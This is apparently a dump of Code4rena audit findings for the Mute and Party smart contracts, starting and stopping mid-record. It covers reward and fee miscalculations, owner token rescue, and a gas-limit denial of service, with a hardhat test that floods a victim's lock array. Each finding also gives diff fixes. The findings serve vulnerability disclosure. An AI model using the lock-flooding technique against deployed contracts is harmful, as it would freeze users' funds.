block.timestamp.sub(_mostRecentValueCalcTime);             uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime));              if (block.timestamp < endTime) {                 value = sinceLastCalc.mul(perSecondReward);             } else {                 uint256 sinceEndTime = block.timestamp.sub(endTime);                 value = (sinceLastCalc.sub(sinceEndTime)).mul(perSecondReward);             }              _totalWeight = _totalWeight.add(value.mul(10**18).div(totalCurrentStake));              _mostRecentValueCalcTime = block.timestamp;              (uint fee0, uint fee1) = IMuteSwitchPairDynamic(lpToken).claimFees();              _totalWeightFee0 = _totalWeightFee0.add(fee0.mul(10**18).div(totalCurrentStake));             _totalWeightFee1 = _totalWeightFee1.add(fee1.mul(10**18).div(totalCurrentStake));              totalFees0 = totalFees0.add(fee0);             totalFees1 = totalFees1.add(fee1);         }          _;     } ```  Consider the following situation. An user X has staked a large amount of LP tokens, and a user Y has staked a normal amount.  Y withdraws as soon as the staking period ends (block.timestamp > endTime), triggering the update modifier, which sets `_mostRecentValueCalcTime = block.timestamp` > endTime. Observe that after this point, the amplifier will never call claimFees again since `_mostRecentValueCalcTime < endTime` will forever be false.   Meanwhile, X forgot about it, and doesn't withdraw until say 2 weeks after endTime. When X calls withdraw, X won't get the LP fees for those 2 weeks. In fact, nobody will - they are trapped inside the mute switch pair forever since the amplifier won't call claim.   ## Impact Some LP fees can be trapped inside the mute switch pair when it should really be going to the amplifier users.   ## Tools Used Manual Review  ## Recommended Mitigation Steps I believe it's best to move the [LP fee calculation](https://github.com/code-423n4/2023-03-mute/blob/main/contracts/amplifier/MuteAmplifier.sol#L111-L117) out of the if statement."}, {"title": "MuteAmplifier.sol: multiplier calculation is incorrect which leads to loss of rewards for almost all stakers", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/19", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L473-L499 https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L366-L388 https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L417-L460   # Vulnerability details  ## Impact This report deals with how the calculation of the `multiplier` in the `MuteAmplifier` contract is not only different from how it is displayed in the [documentation on the website](https://wiki.mute.io/mute/mute-switch/amplifier) but it is also different in a very important way.    The calculation on the website shows a linear relationship between the `dMUTE / poolSize` ratio and the `APY`. The `dMUTE / poolSize` ratio is also called the `tokenRatio`.   By \"linear\" I mean that when a user increases his `tokenRatio` from `0` to `0.1` this has the same effect as when increasing it from `0.9` to `1`.    The implementation in the `MuteAmplifier.calculateMultiplier` function does not have this linear relationship between `tokenRatio` and `APY`.   An increase in the `tokenRatio` from `0` to `0.1` is worth much less than an increase from `0.9` to `1`.    As we will see this means that all stakers that do not have a `tokenRatio` of exactly equal `0` or exactly equal `1` lose out on rewards that they should receive according to the documentation.    I estimate this to be of \"High\" severity because the issue affects nearly all stakers and results in a partial loss of rewards.    ## Proof of Concept Let's first look at the `multiplier` calculation from the [documentation](https://wiki.mute.io/mute/mute-switch/amplifier):    ![multiplier](https://user-images.githubusercontent.com/118979828/229354171-7308e84d-435a-4e41-989d-5c37b5ad0faa.png)  ![multiplier_example](https://user-images.githubusercontent.com/118979828/229354217-2277ae01-8088-479a-8691-6bf4ad62387a.png)  The example calculation shows that the amount that is added to $APY_{base}$ (5%) is scaled linearly by the $\\dfrac{user_{dmute}}{pool_{rewards}}$ ratio which I called `tokenRatio` above.    This means that when a user increases his `tokenRatio` from say `0` to `0.1` he gets the same additional reward as when he increases the `tokenRatio` from say `0.9` to `1`.    Let's now look at how the reward and thereby the `multiplier` is calculated in the code.    The first step is to calculate the `multiplier` which happens in the `MuteAmplifier.calculateMultiplier` function:    [Link](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L473-L499)   ```solidity function calculateMultiplier(address account, bool enforce) public view returns (uint256) {     require(account != address(0), \"MuteAmplifier::calculateMultiplier: missing account\");       uint256 accountDTokenValue;       // zkSync block.number = L1 batch number. This at times is the same for a few minutes. To avoid breaking the call to the dMute contract     // we take the previous block into account     uint256 staked_block =  _userStakedBlock[account] == block.number ? _userStakedBlock[account] - 1 : _userStakedBlock[account];       if(staked_block != 0 && enforce)         accountDTokenValue = IDMute(dToken).getPriorVotes(account, staked_block);     else         accountDTokenValue = IDMute(dToken).getPriorVotes(account, block.number - 1);       if(accountDTokenValue == 0){         return _stakeDivisor;     }       uint256 stakeDifference = _stakeDivisor.sub(10 ** 18);       // ratio of dMute holdings to pool     uint256 tokenRatio = accountDTokenValue.mul(10**18).div(totalRewards);       stakeDifference = stakeDifference.mul(clamp_value(tokenRatio, 10**18)).div(10**18);       return _stakeDivisor.sub(stakeDifference); } ```  The `multiplier` that is returned is then used to calculate the `reward`:    [Link](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L371)   ```solidity reward = lpTokenOut.mul(_totalWeight.sub(_userWeighted[account])).div(calculateMultiplier(account, true)); ```  Let's write the formula in a more readable form:    $\\dfrac{lpTokenOut * weightDifference}{stakeDivisor - tokenRatio * (stakeDivisor - 1)}$  $stakeDivisor$ can be any number $>=1$ and has the purpose of determining the percentage of rewards a user with $tokenRatio=0$ gets.    For the sake of this argument we can assume that all numbers except $tokenRatio$ are constant.    Let's just say $stakeDivisor=2$ which means that a user with $tokenRatio=0\u00a7 would receive $\\dfrac{1}{2}=50\\%$ of the maximum rewards.    Further let's say that $lpTokenOut * weightDifference = 1$, so 100% of the possible rewards would be $1$.    We can then write the formula like this:    $\\dfrac{1}{2 - tokenRatio}$  So let's compare the calculation from the documentation with the calculation from the code by looking at a plot:    ![functions](https://user-images.githubusercontent.com/118979828/229356435-49bcba3c-968e-4613-aded-89c2d0145905.png)  ![plot](https://user-images.githubusercontent.com/118979828/229355365-9236bf2c-6bd5-4732-97b9-2d008043b7cc.png)    **x-axis: tokenRatio**   **y-axis: percentage of maximum rewards**     We can see that the green curve is non-linear and below the blue curve.    So the rewards as calculated in the code are too low.    ## Tools Used VSCode   ## Recommended Mitigation Steps I recommend to change the reward calculation to this:    $(lpTokenOut * weightDifference) * (percentage_{min} + clamp(\\dfrac{user_{dmute}}{pool_{rewards}},1) * (1 - percentage_{min}))$  Instead of setting the `stakeDivisor` upon initialization, the `percentageMin` should be set which can be in the interval `[0,1e18]`.    Fix:   ```diff diff --git a/contracts/amplifier/MuteAmplifier.sol b/contracts/amplifier/MuteAmplifier.sol index 9c6fcb5..1c86f5c 100644 --- a/contracts/amplifier/MuteAmplifier.sol +++ b/contracts/amplifier/MuteAmplifier.sol @@ -48,7 +48,7 @@ contract MuteAmplifier is Ownable{        uint256 private _mostRecentValueCalcTime; // latest update modifier timestamp   -    uint256 public _stakeDivisor; // divisor set in place for modification of reward boost +    uint256 public _percentageMin; // minimum percentage set in place for modification of reward boost        uint256 public management_fee; // lp withdrawal fee      address public treasury; // address that receives the lp withdrawal fee @@ -131,8 +131,8 @@ contract MuteAmplifier is Ownable{       *  @param _mgmt_fee uint       *  @param _treasury address       */ -    constructor (address _lpToken, address _muteToken, address _dToken, uint256 divisor, uint256 _mgmt_fee, address _treasury) { -        require(divisor >= 10 ** 18, \"MuteAmplifier: invalid _stakeDivisor\"); +    constructor (address _lpToken, address _muteToken, address _dToken, uint256 percentageMin, uint256 _mgmt_fee, address _treasury) { +        require(_percentageMin <= 10 ** 18, \"MuteAmplifier: invalid _percentageMin\");          require(_lpToken != address(0), \"MuteAmplifier: invalid lpToken\");          require(_muteToken != address(0), \"MuteAmplifier: invalid muteToken\");          require(_dToken != address(0), \"MuteAmplifier: invalid dToken\"); @@ -142,7 +142,7 @@ contract MuteAmplifier is Ownable{          lpToken = _lpToken;          muteToken = _muteToken;          dToken = _dToken; -        _stakeDivisor = divisor; +        _percentageMin = percentageMin;          management_fee = _mgmt_fee; //bps 10k          treasury = _treasury;   @@ -368,7 +368,7 @@ contract MuteAmplifier is Ownable{          require(lpTokenOut > 0, \"MuteAmplifier::_applyReward: no coins staked\");            // current rewards based on multiplier -        reward = lpTokenOut.mul(_totalWeight.sub(_userWeighted[account])).div(calculateMultiplier(account, true)); +        reward = lpTokenOut.mul(_totalWeight.sub(_userWeighted[account])).div(10 ** 18).mul(calculateMultiplier(account, true)).div(10 ** 18);          // max possible rewards          remainder = lpTokenOut.mul(_totalWeight.sub(_userWeighted[account])).div(10**18);          // calculate left over rewards @@ -442,7 +442,7 @@ contract MuteAmplifier is Ownable{              uint256 _totalWeightFee1Local = _totalWeightFee1.add(fee1.mul(10**18).div(totalCurrentStake));                // current rewards based on multiplier -            info.currentReward = totalUserStake(user).mul(totWeightLocal.sub(_userWeighted[user])).div(info.multiplier_last); +            info.currentReward = totalUserStake(user).mul(totWeightLocal.sub(_userWeighted[user])).div(10 ** 18).mul(info.multiplier_last).div(10 ** 18);              // add back any accumulated rewards              info.currentReward = info.currentReward.add(_userAccumulated[user]);   @@ -452,7 +452,7 @@ contract MuteAmplifier is Ownable{            } else {            // current rewards based on multiplier -          info.currentReward = totalUserStake(user).mul(_totalWeight.sub(_userWeighted[user])).div(info.multiplier_last); +          info.currentReward = totalUserStake(user).mul(_totalWeight.sub(_userWeighted[user])).div(10 ** 18).mul(info.multiplier_last).div(10 ** 18);            // add back any accumulated rewards            info.currentReward = info.currentReward.add(_userAccumulated[user]);          } @@ -485,17 +485,17 @@ contract MuteAmplifier is Ownable{            accountDTokenValue = IDMute(dToken).getPriorVotes(account, block.number - 1);            if(accountDTokenValue == 0){ -          return _stakeDivisor; +          return _percentageMin;          }   -        uint256 stakeDifference = _stakeDivisor.sub(10 ** 18); +        uint256 percentageDifference = (uint256(10 ** 18)).sub(_percentageMin);            // ratio of dMute holdings to pool          uint256 tokenRatio = accountDTokenValue.mul(10**18).div(totalRewards);   -        stakeDifference = stakeDifference.mul(clamp_value(tokenRatio, 10**18)).div(10**18); +        uint256 additionalPercentage = percentageDifference.mul(clamp_value(tokenRatio, 10**18)).div(10**18);   -        return _stakeDivisor.sub(stakeDifference); +        return _percentageMin.add(additionalPercentage);      } ``` "}, {"title": "MuteAmplifier.sol: rescueTokens function does not prevent fee tokens from being transferred", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/18", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L180-L194   # Vulnerability details  ## Impact The [`MuteAmplifier.rescueTokens`](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L180-L194) function allows the `owner` to withdraw tokens that are not meant to be in this contract.    The contract does protect tokens that ARE meant to be in the contract by not allowing them to be transferred:    [Link](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L180-L194)   ```solidity function rescueTokens(address tokenToRescue, address to, uint256 amount) external virtual onlyOwner nonReentrant {     if (tokenToRescue == lpToken) {         require(amount <= IERC20(lpToken).balanceOf(address(this)).sub(_totalStakeLpToken),             \"MuteAmplifier::rescueTokens: that Token-Eth belongs to stakers\"         );     } else if (tokenToRescue == muteToken) {         if (totalStakers > 0) {             require(amount <= IERC20(muteToken).balanceOf(address(this)).sub(totalRewards.sub(totalClaimedRewards)),                 \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"             );         }     }       IERC20(tokenToRescue).transfer(to, amount); } ```  You can see that `lpToken` and `muteToken` cannot be transferred unless there is an excess amount beyond what is needed by the contract.    So stakers can be sure that not even the contract `owner` can mess with their stakes.    The issue is that `lpToken` and `muteToken` are not the only tokens that need to stay in the contract.    There is also the `fee0` token and the `fee1` token.    So what can happen is that the `owner` can withdraw `fee0` or `fee1` tokens and users cannot [`payout`](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L275-L311) rewards or [`withdraw`](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L228-L270) their stake because the transfer of `fee0` / `fee1` tokens reverts due to the missing balance.    Users can of course send `fee0` / `fee1` tokens to the contract to restore the balance. But this is not intended and certainly leaves the user worse off.    ## Proof of Concept Assume that when an update occurs via the `update` modifier there is an amount of `fee0` tokens claimed:    [Link](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L88-L121)   ```solidity     modifier update() {         if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         }           uint256 totalCurrentStake = totalStake();           if (totalCurrentStake > 0 && _mostRecentValueCalcTime < endTime) {             uint256 value = 0;             uint256 sinceLastCalc = block.timestamp.sub(_mostRecentValueCalcTime);             uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime));               if (block.timestamp < endTime) {                 value = sinceLastCalc.mul(perSecondReward);             } else {                 uint256 sinceEndTime = block.timestamp.sub(endTime);                 value = (sinceLastCalc.sub(sinceEndTime)).mul(perSecondReward);             }               _totalWeight = _totalWeight.add(value.mul(10**18).div(totalCurrentStake));               _mostRecentValueCalcTime = block.timestamp;               (uint fee0, uint fee1) = IMuteSwitchPairDynamic(lpToken).claimFees();               _totalWeightFee0 = _totalWeightFee0.add(fee0.mul(10**18).div(totalCurrentStake));             _totalWeightFee1 = _totalWeightFee1.add(fee1.mul(10**18).div(totalCurrentStake));               totalFees0 = totalFees0.add(fee0);             totalFees1 = totalFees1.add(fee1);         }           _;     } ```  We can see that `_totalWeightFee0` is updated such that when a user's rewards are calculated the `fee0` tokens will be paid out to the user.    What happens now is that the `owner` calls `rescueTokens` which transfers the `fee0` tokens out of the contract.    We can see that when the `fee0` to be paid out to the user is calculated in the `_applyReward` function, the calculation is solely based on `_totalWeightFee0` and does not take into account if the `fee0` tokens still exist in the contract.    [Link](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L379)   ```solidity fee0 = lpTokenOut.mul(_totalWeightFee0.sub(_userWeightedFee0[account])).div(10**18); ```  So when the `fee0` tokens are attempted to be transferred to the user that calls `payout` or `withdraw`, the transfer reverts due to insufficient balance.    ## Tools Used VSCode  ## Recommended Mitigation Steps The `MuteAmplifier.rescueTokens` function should check that only excess `fee0` / `fee1` tokens can be paid out. Such that tokens that will be paid out to stakers need to stay in the contract.    Fix:   ```diff diff --git a/contracts/amplifier/MuteAmplifier.sol b/contracts/amplifier/MuteAmplifier.sol index 9c6fcb5..b154d81 100644 --- a/contracts/amplifier/MuteAmplifier.sol +++ b/contracts/amplifier/MuteAmplifier.sol @@ -188,6 +188,18 @@ contract MuteAmplifier is Ownable{                      \"MuteAmplifier::rescueTokens: that muteToken belongs to stakers\"                  );              } +        } else if (tokenToRescue == address(IMuteSwitchPairDynamic(lpToken).token0())) { +            if (totalStakers > 0) { +                require(amount <= IERC20(IMuteSwitchPairDynamic(lpToken).token0()).balanceOf(address(this)).sub(totalFees0.sub(totalClaimedFees0)), +                    \"MuteAmplifier::rescueTokens: that token belongs to stakers\" +                ); +            } +        } else if (tokenToRescue == address(IMuteSwitchPairDynamic(lpToken).token1())) { +            if (totalStakers > 0) { +                require(amount <= IERC20(IMuteSwitchPairDynamic(lpToken).token1()).balanceOf(address(this)).sub(totalFees1.sub(totalClaimedFees1)), +                    \"MuteAmplifier::rescueTokens: that token belongs to stakers\" +                ); +            }          }            IERC20(tokenToRescue).transfer(to, amount); ```  The issue discussed in this report also ties in with the fact that the `fee0 <= totalFees0 && fee1 <= totalFees1` check before transferring fee tokens always passes. It does not prevent the scenario that the sponsor wants to prevent which is when there are not enough fee tokens to be transferred the transfer should not block the function.    So in addition to the above changes I propose to add these changes as well:    ```diff diff --git a/contracts/amplifier/MuteAmplifier.sol b/contracts/amplifier/MuteAmplifier.sol index 9c6fcb5..39cd75b 100644 --- a/contracts/amplifier/MuteAmplifier.sol +++ b/contracts/amplifier/MuteAmplifier.sol @@ -255,7 +255,7 @@ contract MuteAmplifier is Ownable{          }            // payout fee0 fee1 -        if ((fee0 > 0 || fee1 > 0) && fee0 <= totalFees0 && fee1 <= totalFees1) { +        if ((fee0 > 0 || fee1 > 0) && fee0 < IERC20(IMuteSwitchPairDynamic(lpToken).token0()).balanceOf(address(this)) && fee1 < IERC20(IMuteSwitchPairDynamic(lpToken).token1()).balanceOf(address(this))) {              address(IMuteSwitchPairDynamic(lpToken).token0()).safeTransfer(msg.sender, fee0);              address(IMuteSwitchPairDynamic(lpToken).token1()).safeTransfer(msg.sender, fee1);   @@ -295,7 +295,7 @@ contract MuteAmplifier is Ownable{          }            // payout fee0 fee1 -        if ((fee0 > 0 || fee1 > 0) && fee0 <= totalFees0 && fee1 <= totalFees1) { +        if ((fee0 > 0 || fee1 > 0) && fee0 < IERC20(IMuteSwitchPairDynamic(lpToken).token0()).balanceOf(address(this)) && fee1 < IERC20(IMuteSwitchPairDynamic(lpToken).token1()).balanceOf(address(this))) {              address(IMuteSwitchPairDynamic(lpToken).token0()).safeTransfer(msg.sender, fee0);              address(IMuteSwitchPairDynamic(lpToken).token1()).safeTransfer(msg.sender, fee1);   @@ -331,7 +331,7 @@ contract MuteAmplifier is Ownable{              }                // payout fee0 fee1 -            if ((fee0 > 0 || fee1 > 0) && fee0 <= totalFees0 && fee1 <= totalFees1) { +            if ((fee0 > 0 || fee1 > 0) && fee0 < IERC20(IMuteSwitchPairDynamic(lpToken).token0()).balanceOf(address(this)) && fee1 < IERC20(IMuteSwitchPairDynamic(lpToken).token1()).balanceOf(address(this))) {                  address(IMuteSwitchPairDynamic(lpToken).token0()).safeTransfer(account, fee0);                  address(IMuteSwitchPairDynamic(lpToken).token1()).safeTransfer(account, fee1); ```"}, {"title": "dMute.sol: Attacker can push lock items to victim's array such that redemptions are forever blocked", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/6", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-03"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/dao/dMute.sol#L90-L129 https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/dao/dMute.sol#L135-L139   # Vulnerability details  ## Impact This report deals with how an attacker can abuse the fact that he can lock `MUTE` tokens for any other user and thereby push items to the array of `UserLockInfo` structs of the user.    There are two functions in the `dMute` contract that iterate over all items in this array ([`RedeemTo`](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/dao/dMute.sol#L90-L129) and [`GetUnderlyingTokens`](https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/dao/dMute.sol#L135-L139)).    Thereby if the attacker pushes sufficient items to the array of a user, he can make the above two functions revert since they require more Gas than the Block Gas Limit.    According to the `zkSync` documentation the block gas limit is currently 12.5 million ([Link](https://docs.zksync.io/userdocs/tech/#:~:text=With%20the%20current%20block%20gas,can%20process%20over%202000%20TPS.)).    The attack is of \"High\" impact for the `RedeemTo` function since this function needs to succeed in order for the user to redeem his `MUTE` tokens.    The user might have a lot of `MUTE` tokens locked and the attacker can make it such that they can never be redeemed. The attacker cannot gain a profit from this attack, i.e. he cannot steal anything, but due to the possibility of this attack users will not lock their tokens, especially not a lot of them.    This is all the more severe because the `MuteBond` and `MuteAmplifier` contracts also rely on the locking functionality so those upstream features can also not be used securely.    In the Mitigation section I will show how the `GetUnderlyingTokens` function can be made to run in $O(1)$ time instead of $O(lock\\:array\\:length)$.    The `RedeemTo` function can be made to run in $O(indexes\\:array\\:length)$ instead of $O(lock\\:array\\:length)$. The length of the indexes array is determined by the user and simply tells how many locked items to redeem. So there is no possibility of DOS.    ## Proof of Concept Note: a redemption costs `~7 million Gas` when 1000 items are locked. So when running on the `zkSync` network even 2000 items should be enough. The hardhat tests use a local Ethereum network instead of a fork of `zkSync` so in order to hit `30 million Gas` (which is the Ethereum block gas limit) we need to add more items to the queue.    You can add the following test to the `dao.ts` test file:   ```javascript it('Lock DOS', async function () {     var tx = await muteToken.approve(dMuteToken.address, MaxUint256)       let lock_time_week = new BigNumber(60 * 60 * 24 * 7);     let max_lock = lock_time_week.times(52);      let lock_amount = new BigNumber(1).times(Math.pow(10,2))      // @audit fill up array     for(let i=0;i<5000;i++) {         tx = await dMuteToken.LockTo(lock_amount.toFixed(0), lock_time_week.toFixed(),owner.address)     }      await time.increase(60 * 60 * 24 * 7)      tx = await dMuteToken.Redeem([0]) }) ``` It adds `5000` lock items to the array of the `owner` address. When the `owner` then tries to redeem even a single lock the transaction fails due to an out of gas error.    (Sometimes it reverts with `TransactionExecutionError: Transaction ran out of gas` error sometimes it reverts due to timeout. If you try a few times it should revert with the out of gas error.)    The amount of `MUTE` tokens that the attacker loses to execute this attack is negligible. As you can see in the test `100 Wei * 5000 = 500,000 Wei` is sufficient (There needs to be some amount of `MUTE` such that the `LockTo` function does not revert). The only real cost comes down to Gas costs which are cheap on `zkSync`.    ## Tools Used VSCode  ## Recommended Mitigation Steps First for the `GetUnderlyingTokens` function: The contract should keep track of underlying token amounts for each user in a mapping that is updated with every lock / redeem call. The `GetUnderlyingTokens` function then simply needs to return the value from this mapping.    Secondly, fixing the issue with the `RedeemTo` function is a bit harder. I discussed this with the sponsor and I have been told they don't want this function to require an already sorted `lock_index` array as parameter. So the `lock_index` array can contain indexes in random order.    This means it must be sorted internally. Depending on the expected length of the `lock_index` array different sorting algorithms may be used. I recommend to use an algorithm like [quick sort](https://gist.github.com/subhodi/b3b86cc13ad2636420963e692a4d896f) to allow for many indexes to be specified at once.    I will use a placeholder for the sorting algorithm for now so the sponsor may decide which one to use.    The proposed fixes for both functions are then like this:   ```diff diff --git a/contracts/dao/dMute.sol b/contracts/dao/dMute.sol index 59f95b7..11d21fb 100644 --- a/contracts/dao/dMute.sol +++ b/contracts/dao/dMute.sol @@ -18,6 +18,7 @@ contract dMute is dSoulBound {      }        mapping(address => UserLockInfo[]) public _userLocks; +    mapping(address => uint256) public _amounts;        uint private unlocked = 1;   @@ -79,6 +80,7 @@ contract dMute is dSoulBound {          _mint(to, tokens_to_mint);            _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint)); +        _amounts[to] = _amounts[to] + _amount;            emit LockEvent(to, _amount, tokens_to_mint, _lock_time);      } @@ -91,8 +93,14 @@ contract dMute is dSoulBound {          uint256 total_to_redeem = 0;          uint256 total_to_burn = 0;   -        for(uint256 i; i < lock_index.length; i++){ -          uint256 index = lock_index[i]; +        /////////////////////////////////////////////// +        //                                           // +        // sort lock_index array in ascending order // +        //                                          // +        ////////////////////////////////////////////// + +        for(uint256 i = lock_index.length; i > 0; i--){ +          uint256 index = lock_index[i - 1];            UserLockInfo memory lock_info = _userLocks[msg.sender][index];              require(block.timestamp >= lock_info.time, \"dMute::Redeem: INSUFFICIENT_LOCK_TIME\"); @@ -102,23 +110,14 @@ contract dMute is dSoulBound {            total_to_redeem = total_to_redeem.add(lock_info.amount);            total_to_burn = total_to_burn.add(lock_info.tokens_minted);   -          _userLocks[msg.sender][index] = UserLockInfo(0,0,0); +          _userLocks[msg.sender][index] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1]; +          _userLocks[msg.sender].pop();          }            require(total_to_redeem > 0, \"dMute::Lock: INSUFFICIENT_REDEEM_AMOUNT\");          require(total_to_burn > 0, \"dMute::Lock: INSUFFICIENT_BURN_AMOUNT\");   - -        for(uint256 i = _userLocks[msg.sender].length; i > 0; i--){ -          UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1]; - -          // recently redeemed lock, destroy it -          if(lock_info.time == 0){ -            _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1]; -            _userLocks[msg.sender].pop(); -          } -        } - +        _amounts[msg.sender] = _amounts[msg.sender] + total_to_redeem;          //redeem tokens to user          IERC20(MuteToken).transfer(to, total_to_redeem);          //burn dMute @@ -133,8 +132,6 @@ contract dMute is dSoulBound {      }        function GetUnderlyingTokens(address account) public view returns(uint256 amount) { -        for(uint256 i; i < _userLocks[account].length; i++){ -          amount = amount.add(_userLocks[account][i].amount); -        } +        return _amounts[account];      }  } ```    "}, {"title": "Division-before-multiplication precision loss issue for update()", "html_url": "https://github.com/code-423n4/2023-03-mute-findings/issues/4", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden"], "target": "2023-03-mute-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-03-mute/blob/4d8b13add2907b17ac14627cfa04e0c3cc9a2bed/contracts/amplifier/MuteAmplifier.sol#L88-L121   # Vulnerability details  ## Impact Detailed description of the impact of this finding. There is a division-before-multiplication precision loss issue for update().  ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.  The update() function has a division-before-multiplication precision loss issue.   First, the calculation of ``perSecondReward`` uses a division:  ```javascript uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime)); ```  Then, the calculation of ``value`` uses a multiplication. ```javascript if (block.timestamp < endTime) {                 value = sinceLastCalc.mul(perSecondReward);             } else {                 uint256 sinceEndTime = block.timestamp.sub(endTime);                 value = (sinceLastCalc.sub(sinceEndTime)).mul(perSecondReward);             } ```  Suppose that the total reward time is one year = 31,536,000 seconds, then the precision loss could be up to 31,536,000, which is significant for ``perSecondReward``.   ## Tools Used VScode  ## Recommended Mitigation Steps Use the multiplication-after-division pattern  Mitigation: use multiplication-before-division instead ```diff modifier update() {         if (_mostRecentValueCalcTime == 0) {             _mostRecentValueCalcTime = firstStakeTime;         }          uint256 totalCurrentStake = totalStake();          if (totalCurrentStake > 0 && _mostRecentValueCalcTime < endTime) {             uint256 value = 0;             uint256 sinceLastCalc = block.timestamp.sub(_mostRecentValueCalcTime); -            uint256 perSecondReward = totalRewards.div(endTime.sub(firstStakeTime)); +            uint256 rewardPeriod = endTime.sub(firstStakeTime);              if (block.timestamp < endTime) { -                value = sinceLastCalc.mul(perSecondReward); +                 value = sinceLastCalc.mul(totalRewards).div(rewardPeriod);             } else {                 uint256 sinceEndTime = block.timestamp.sub(endTime); -                value = (sinceLastCalc.sub(sinceEndTime)).mul(perSecondReward); +                value = (sinceLastCalc.sub(sinceEndTime)).mul(totalRewards).div(rewardPeriod);             }              _totalWeight = _totalWeight.add(value.mul(10**18).div(totalCurrentStake));              _mostRecentValueCalcTime = block.timestamp;              (uint fee0, uint fee1) = IMuteSwitchPairDynamic(lpToken).claimFees();              _totalWeightFee0 = _totalWeightFee0.add(fee0.mul(10**18).div(totalCurrentStake));             _totalWeightFee1 = _totalWeightFee1.add(fee1.mul(10**18).div(totalCurrentStake));              totalFees0 = totalFees0.add(fee0);             totalFees1 = totalFees1.add(fee1);         }          _;     } ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/47", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-04-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-party-findings/blob/main/data/evan-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/43", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2023-04-party-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-party-findings/blob/main/data/hansfriese-Q.md)."}, {"title": "Use of _mint in ReraiseETHCrowdfund#_contribute is incompatible with PartyGovernanceNFT#mint ", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/42", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L256-L303   # Vulnerability details  ## Impact  Misconfigured receiver could accidentally DOS party  ## Proof of Concept  [ReraiseETHCrowdfund.sol#L238](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238)          if (previousVotingPower == 0) _mint(contributor); <- @audit-issue standard minting here  [ReraiseETHCrowdfund.sol#L374](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L374)              uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate); <- @audit-issue uses party.mint  